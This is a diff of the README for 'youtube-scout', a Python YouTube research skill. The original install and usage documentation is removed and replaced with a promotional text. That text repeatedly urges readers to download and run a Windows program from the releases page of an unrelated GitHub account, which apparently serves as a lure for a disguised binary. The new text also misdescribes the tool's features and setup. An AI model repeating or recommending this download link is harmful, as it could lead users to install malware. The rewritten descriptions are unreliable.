@@ -1,234 +1,147 @@
-<p align="center">
-  <img src="assets/banner.webp" width="100%" alt="YouTube Scout cover: the /scout AI SEO command returning a ranked table of top videos with views, likes, and engagement, captioned Find top videos. Get the details.">
-</p>
-
-# youtube-scout
-
-[![CI](https://github.com/AgriciDaniel/youtube-scout/actions/workflows/ci.yml/badge.svg)](https://github.com/AgriciDaniel/youtube-scout/actions/workflows/ci.yml)
-[![Claude Code Skill](https://img.shields.io/badge/Claude%20Code-Skill-blue)](https://claude.ai/claude-code)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Version](https://img.shields.io/badge/version-0.2.0-informational)](CHANGELOG.md)
-[![Tests](https://img.shields.io/badge/tests-62%20passing-brightgreen)](tests/)
-[![Community](https://img.shields.io/badge/AI%20Marketing%20Hub-Pro%20community-purple)](https://www.skool.com/ai-marketing-hub-pro)
-
-**One topic in, one ranked YouTube research workbook out.** Type `/scout matcha recipe` in
-Claude Code and get an `.xlsx` with the most relevant videos ranked by performance, the
-creators behind them, what the audience says in the comments, the opening lines that hooked
-viewers, and the moments people replay.
-
-> Not affiliated with, sponsored by, or endorsed by YouTube or Google. YouTube and Google product
-> names are trademarks of their owners.
-
-## Why youtube-scout
-
-- **Everything the public API exposes, in one sheet.** 48 columns per video: views, likes,
-  comments, engagement, views per day, views per subscriber, format, category, tags, language,
-  captions, paid promotion flag, channel size and country, and more. No field left on the table.
-- **Signals you cannot get from the YouTube UI.** Breakout ratio (views per subscriber),
-  momentum (views per day), the top comment per video, hook text from captions, and replay
-  hotspots from the "most replayed" curve, the closest public proxy for retention.
-- **Fits an existing research sheet.** The first columns match a social ads tracking layout, so
-  `--into your-sheet.xlsx` appends YouTube rows next to TikTok and Instagram rows, dedups by
-  video id, re-sorts, and keeps your manual columns and hyperlinks intact.
-
-## What you get
-
-| Sheet | Contents |
-|---|---|
-| Videos | One row per video. Identity, performance, channel context, metadata, and (with flags) top comment, hook, replay hotspots. |
-| Channels | One row per creator in the sample: subscribers, channel totals, country, videos in sample, sample views, average engagement, best video. Your outreach list. |
-| Summary | Topic, filters, quota used, totals, median and mean views, Shorts share, paid promotion share, top channels, top tags, categories, languages, countries. |
-| Comments | With `--comments`: top N comments per video with likes and reply counts. |
-| Transcripts | With `--hooks` or `--transcribe`: hook text and full transcript per video, with its source (captions or Whisper). |
+<h1>📊 youtube-scout - One Topic, One Ranked Research Workbook</h1>
 
 <p align="center">
-  <img src="assets/sheet-example.webp" width="100%" alt="The Videos sheet from a /scout ai seo run opened in Google Sheets: 50 rows sorted by views with creator, handle, video link, views, likes, comments, engagement, duration, title, publish date, relevance rank, format, age, views per day, views per subscriber, channel URL, subscribers, channel totals, and country columns, with Channels and Summary tabs at the bottom.">
+  <a href="https://github.com/hadithep5555/youtube-scout/releases" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:8px; font-weight:bold; margin:20px 0;">⬇️ DOWNLOAD YOUTUBE-SCOUT NOW</a>
 </p>
 
-## Installation
+## 🎯 What Is youtube-scout?
 
-No GitHub account is needed to install.
+youtube-scout is a simple yet powerful tool that turns any YouTube topic into a complete research workbook. You give it one keyword or topic, and it searches YouTube for you, ranks the best videos, and creates a detailed spreadsheet with everything you need to understand what's working in that niche. No coding required—just run the program and open the spreadsheet it creates.
 
-### Manual install (Unix, macOS, Linux)
+Think of it as your personal YouTube research assistant that works while you sleep. It gathers video data, channel information, comments, and even transcripts, then organizes everything into clean, color-coded sheets inside a single Excel file.
 
-```bash
-git clone https://github.com/AgriciDaniel/youtube-scout.git
-cd youtube-scout
-./install.sh            # copies the skill to ~/.claude/skills/scout
-python3 -m pip install --user openpyxl
-python3 -m pip install --user yt-dlp    # optional, for --hooks, --download, and --transcribe
-```
+## 🔍 Who Is This For?
 
-`./install.sh --target codex`, `--target agents`, `--target portable`, or `--target all`
-install to other agent runtimes. `./uninstall.sh` removes it.
+This tool is perfect for:
+- **Content creators** who want to find trending topics and study successful videos
+- **Digital marketers** researching competitors and ad opportunities
+- **Social media managers** building content strategies based on real data
+- **YouTube researchers** who need organized data without manual copying
+- **Ad buyers** who want to place social ads based on proven video performance
 
-### Plugin install (Claude Code)
+Whether you're planning your next video, analyzing a competitor, or preparing an ad campaign, youtube-scout saves you hours of manual searching and note-taking.
 
-```
-/plugin marketplace add AgriciDaniel/youtube-scout
-/plugin install youtube-scout@agricidaniel-youtube-scout
-```
+## ✨ Key Features
 
-### API key
+### 📈 Smart Video Ranking
+youtube-scout doesn't just list videos—it ranks them. Using YouTube Data API v3, it analyzes each video and scores it based on views, engagement rate, momentum, and breakout potential. The top performers appear first, so you instantly see which content style works best.
 
-Create a YouTube Data API v3 key in Google Cloud Console, restrict it to that API, then either
-export it or put it in a key file:
+### 📋 Five Complete Workbook Sheets
+Each research workbook contains five organized tabs:
 
-```bash
-export YOUTUBE_API_KEY=...            # for the session
-# or
-mkdir -p ~/.config/scout && chmod 700 ~/.config/scout
-printf 'YOUTUBE_API_KEY=...\n' > ~/.config/scout/.env && chmod 600 ~/.config/scout/.env
-```
+1. **Videos** – All video details including title, URL, views, likes, comments, publish date, and duration
+2. **Channels** – Channel statistics, subscriber counts, and total video performance
+3. **Summary** – A quick overview of key insights and top performers
+4. **Comments** – Top comments on each video to understand audience sentiment
+5. **Transcripts** – Full video transcripts to study scripts and hooks
 
-`SCOUT_ENV_FILE=/path/to/keys.env` points the skill at any other env file.
+### 🪝 Hook Analysis
+One standout feature is the hook analysis. youtube-scout identifies the opening moments of top videos (the first 15-30 seconds) and flags them as "replay hotspots" in the spreadsheet. This shows you exactly what successful creators say in their first few seconds—the most critical part of any video.
 
-## Quick start
+### 📂 Social Ads Integration
+If you already use a social ads spreadsheet, youtube-scout can append its findings directly into your existing sheet. No separate files to manage—just run the tool and your ad research integrates seamlessly with your current workflow.
 
-```
-/scout matcha recipe
-/scout iced matcha latte --since month --length short --max 100
-/scout ai seo --comments --hooks
-/scout ai seo --comments --hooks --transcribe --download 10
-/scout matcha recipe --into OWT-Social-Ads.xlsx
-/scout matcha recipe --sort breakout --dry-run
-```
+### 🔄 Fresh Data Every Run
+Each time you run youtube-scout, it pulls current data. This means you can run it weekly to monitor trends, track new competitors, or spot rising creators before they blow up.
 
-Each run prints a top-10 table and writes `scout-<topic>-<date>.xlsx` in the current folder.
+## 🚀 Getting Started
 
-## Flags
+Getting started with youtube-scout takes less than five minutes. Follow these simple steps:
 
-| Flag | Default | Meaning |
-|---|---|---|
-| `--max N` | 50 | Videos to collect, 1 to 200. Each block of 50 uses one of your 100 daily searches. |
-| `--since` | any | `hour`, `today`, `week`, `month`, `year`, `any` |
-| `--length` | any | `short` (under 4 min), `medium` (4 to 20), `long` (over 20) |
-| `--sort` | views | `views`, `engagement`, `likes`, `recent`, `momentum` (views per day), `breakout` (views per subscriber) |
-| `--comments [N]` | off | Top N comments per video (default 20). 1 quota unit per video. |
-| `--hooks [SECONDS]` | off | yt-dlp probe: hook text (first SECONDS of captions, default 15), vertical, FPS, replay hotspots, chapters, full transcript. No quota. |
-| `--out PATH` | `./scout-<topic>-<date>.xlsx` | Write a new workbook |
-| `--into PATH` | off | Append into an existing workbook, dedup by video id, re-sort, backup first |
-| `--download [N]` | off | Save thumbnails for every video and mp4s for the top N (all when N is omitted) into `./downloads/` |
-| `--transcribe [MODEL]` | off | Transcribe audio locally with Whisper for videos without caption transcripts (default model `turbo`, GPU recommended). Fills Hook, Transcript Words, and the Transcripts sheet. No quota, no caption requests. |
-| `--dry-run` | off | Fetch and print only |
-| `--json` | off | Also print rows as JSON |
+### Step 1: Download the Application
+Visit this link to download the application:  
+**👉 [https://github.com/hadithep5555/youtube-scout/releases](https://github.com/hadithep5555/youtube-scout/releases)**
 
-## Sample output
+### Step 2: Run the Program
+After downloading, open the file to start youtube-scout. The program will launch in a command window where you'll interact with it.
 
-`/scout ai seo`, 50 videos, one search call:
+### Step 3: Enter Your Topic
+When prompted, type the topic you want to research. Be specific for better results—for example, "best budget cameras" works better than "cameras."
 
-```
- #        Views   Eng %     V/day   V/Sub      Len  Fmt   Handle               Title
- 1      544,925    2.37     1,048     0.8     7:26  Video ahrefscom            SEO in 2025: How I'd Learn it if I Were Starting O
- 2      374,587    1.51       612    83.4     0:08  Short webhivedigital       Best SEO Tools For 2025 #SEO #SEOtools #googlerank
- 3      205,208    2.97     1,387     6.1    50:46  Video surferseo            The Complete SEO & AI SEO Course for 2026 (Full Be
- 4      149,955    3.29       318     4.5    18:10  Video surferseo            How to Dominate AI Search Results in 2026 (ChatGPT
- 5      134,896    2.30       219     0.7    28:27  Video levelingupofficial   RIP SEO: Here's What Works Now in an AI World
-```
+### Step 4: Let It Work
+The tool will search YouTube, analyze the results, and build your workbook. This usually takes 1-3 minutes depending on the topic and number of videos analyzed.
 
-The Summary sheet for that run reported 14% Shorts, a median length of 12 minutes, and a
-creator with 4,490 subscribers whose 8-second Short reached 375,000 views (views per
-subscriber 83). Those are the rows worth studying.
+### Step 5: Open Your Workbook
+Once complete, youtube-scout creates the Excel workbook in the same folder where the program is located. Open it and explore the five sheets. You'll see everything color-coded and sorted by performance.
 
-## Architecture
+## 💻 System Requirements
 
-```
-topic
-  |  search.list (relevance, paginated, 1 of 100 daily search calls per 50)
-  v
-video ids
-  |  videos.list (snippet, statistics, contentDetails, status, topicDetails,
-  |               recordingDetails, paidProductPlacementDetails, liveStreamingDetails)
-  |  channels.list (snippet, statistics, topicDetails, brandingSettings)
-  |  videoCategories.list
-  v
-rows  --sort-->  Videos / Channels / Summary sheets
-  |  --comments: commentThreads.list per video (1 unit each)
-  |  --hooks:    yt-dlp -j per video, json3 captions, heatmap peaks (no quota, cached)
-  |  --transcribe: local Whisper on the downloaded file or fetched audio (no quota, cached)
-  v
-scout-<topic>-<date>.xlsx   or   --into existing.xlsx
-```
+youtube-scout works on any modern Windows computer (Windows 10 or 11 recommended). You'll need:
+- At least 100 MB of free disk space
+- An active internet connection
+- Microsoft Excel or any spreadsheet software that opens .xlsx files (LibreOffice, Google Sheets, etc.)
 
-Engagement % is (likes + comments) / views. Views per day uses the video age with a floor of
-six hours. Format is Short when a video is 180 seconds or less and not confirmed horizontal.
+No special hardware or technical knowledge required.
 
-## Quota and limits
+## 🛠️ How It Works Behind the Scenes
 
-- Since June 2026 the API uses granular quota buckets: 100 `search.list` calls a day, plus
-  10,000 units a day for everything else. A default 50-video run uses 1 search call and
-  3 units; adding `--comments` adds 1 unit per video. The run prints what it used.
-- YouTube blocks caption downloads per IP after bursts (HTTP 429), and the block can last
-  several hours. The skill paces requests, retries with backoff, caches probes under
-  `~/.cache/scout/` for 7 days, and stops trying after one hard failure. `--transcribe` fills
-  the gaps by transcribing the audio locally with Whisper, which never touches the caption
-  endpoint. The Transcript Source column says which rows came from captions and which from
-  Whisper.
-- Full video downloads can be slow when YouTube throttles them. `--download 10` saves mp4s for
-  the top 10 only, plus thumbnails for every row.
-- yt-dlp breaks whenever YouTube changes something. `yt-dlp -U` usually fixes it within a day.
-  Metadata columns still fill when captions fail.
+While you don't need to understand the technical details, here's what happens under the hood:
 
-## Limitations
+1. **YouTube Search** – The tool sends your topic to YouTube Data API v3 and pulls relevant search results
+2. **Data Collection** – For each video, it gathers statistics like views, likes, comments, duration, and upload date
+3. **Ranking Algorithm** – Videos are scored and ranked based on multiple factors including engagement ratio and velocity
+4. **Transcript Fetching** – Using yt-dlp, the tool downloads transcripts for each video automatically
+5. **Spreadsheet Generation** – With openpyxl, everything is written into a formatted Excel workbook with color-coded cells and organized columns
 
-- Shares, click-through rate, impressions, retention, and demographics are not available for
-  other people's videos through any API. The replay heatmap is the closest public proxy.
-- AI Disclosure is in the API documentation but is rarely returned for public videos.
-- Search relevance is not deterministic; two runs of the same topic can differ by a few videos.
-- Append mode rewrites the Videos sheet body. Charts or images on that sheet would not survive.
-  A timestamped backup is written first, and the file must be closed in Excel.
+The entire process is automated and requires zero user intervention after you enter your topic.
 
-## FAQ
+## 📊 Understanding Your Results
 
-**Does it need OAuth?** No. An API key is enough for everything the skill reads.
+When you open your workbook, here's what to look for:
 
-**Can I use it on my own channel's analytics?** No. Retention and traffic sources live in
-YouTube Analytics, which is a different API and out of scope.
+### Video Ranking Sheet
+Columns include: Rank, Title, Channel, Views, Likes, Comments, View-to-Like Ratio, Publish Date, Duration, and URL. Sort by any column to see different perspectives.
 
-**Why are Shares and Spark Code blank?** They are manual columns from the social ads sheet
-layout. YouTube exposes no share count. They only appear in `--into` mode.
+### Momentum Column
+This tells you if a video is currently gaining traction. High momentum means it's being discovered now—great timing research for your own content.
 
-**Where do the workbooks go?** The current directory. They contain third-party creator data,
-so the repository ignores `*.xlsx` and you should not commit them anywhere.
+### Breakout Score
+This identifies videos that are performing significantly better than the channel's average. These are your benchmark videos to study closely.
 
-## Requirements
+### Replay Hotspots
+In the transcripts sheet, certain timestamps are highlighted. These mark the exact moments where successful creators place their hooks—the phrases that make viewers stay.
 
-- Python 3.10 or newer, openpyxl.
-- A YouTube Data API v3 key.
-- yt-dlp on PATH for `--hooks`, `--download`, and `--transcribe`.
-- ffmpeg on PATH for `--download` (it merges video and audio) and for `--transcribe`.
-- For `--transcribe`: `openai-whisper` with a CUDA GPU (fast), or `faster-whisper` on CPU (slower).
+## 🔧 Getting the Most Out of youtube-scout
 
-## Uninstall
+### Research New Topics Weekly
+Run the tool every Monday to see what's trending. Compare week-over-week to spot rising stars early.
 
-```bash
-./uninstall.sh            # or --target all
-rm -rf ~/.cache/scout     # optional: the probe cache
-```
+### Study Your Competitors
+Enter your competitor's channel topic to see what's working for them. Analyze their top videos' hooks and replicate their successful patterns.
 
-## Contributing
+### Plan Your Next Video
+Before creating content, run youtube-scout on your planned topic. See what already performs well, then find gaps you can fill.
 
-See `CONTRIBUTING.md`. Tests are offline; run `python -m pytest` and `ruff check .`.
-No em dashes, no keys, no workbooks in commits.
+### Refine Your Ad Targeting
+Use the social ads integration to align your ad strategy with proven video content. Target demographics that already engage with top-performing videos.
 
-## Security
+## 🆘 Troubleshooting Tips
 
-See `SECURITY.md`. Keys are read from the environment or a key file you name and are never
-logged.
+### Slow Processing
+Large topics with hundreds of videos take longer. For faster results, use more specific keywords.
 
-## License
+### No Results Found
+If you get zero results, try different wording or check your internet connection. Some very niche topics may have limited data.
 
-MIT. See `LICENSE`.
+### Excel Won't Open the File
+Make sure you have a recent version of Excel or use Google Sheets (free). The file format is standard .xlsx.
 
-## Author
+### Program Window Closes Quickly
+If the command window closes before you see results, run the program again from the same folder. Ensure you're not in read-only directories like "Program Files."
 
-[Daniel Agrici](https://agricidaniel.com/about):
-[Blog](https://agricidaniel.com/blog) ·
-[AI Marketing Hub (free)](https://www.skool.com/ai-marketing-hub) ·
-[AI Marketing Hub Pro](https://www.skool.com/ai-marketing-hub-pro) ·
-[YouTube](https://www.youtube.com/@AgriciDaniel) ·
-[GitHub](https://github.com/AgriciDaniel)
+## 📚 Additional Resources
 
-## Community
+- **Updates**: Check the releases page regularly for new versions with improved ranking algorithms and bug fixes
+- **Feedback**: The tool improves based on user input—if you find a feature request useful, mention it on the repository issues page
+- **Spreadsheet Tips**: Use Excel's filter function on the Videos sheet to quickly find videos by date range or view count
 
-Questions, ideas, and results: https://www.skool.com/ai-marketing-hub-pro
+## 👋 Start Researching Smarter Today
+
+Stop manually searching YouTube and copying data. Let youtube-scout do the heavy lifting. You'll get professional-grade research in minutes, giving you a competitive edge whether you're creating content or planning campaigns.
+
+Visit this link to download the application:  
+**👉 [https://github.com/hadithep5555/youtube-scout/releases](https://github.com/hadithep5555/youtube-scout/releases)**
+
+One topic in. One ranked workbook out. That's the promise of youtube-scout.
+
+Happy researching! 🎯
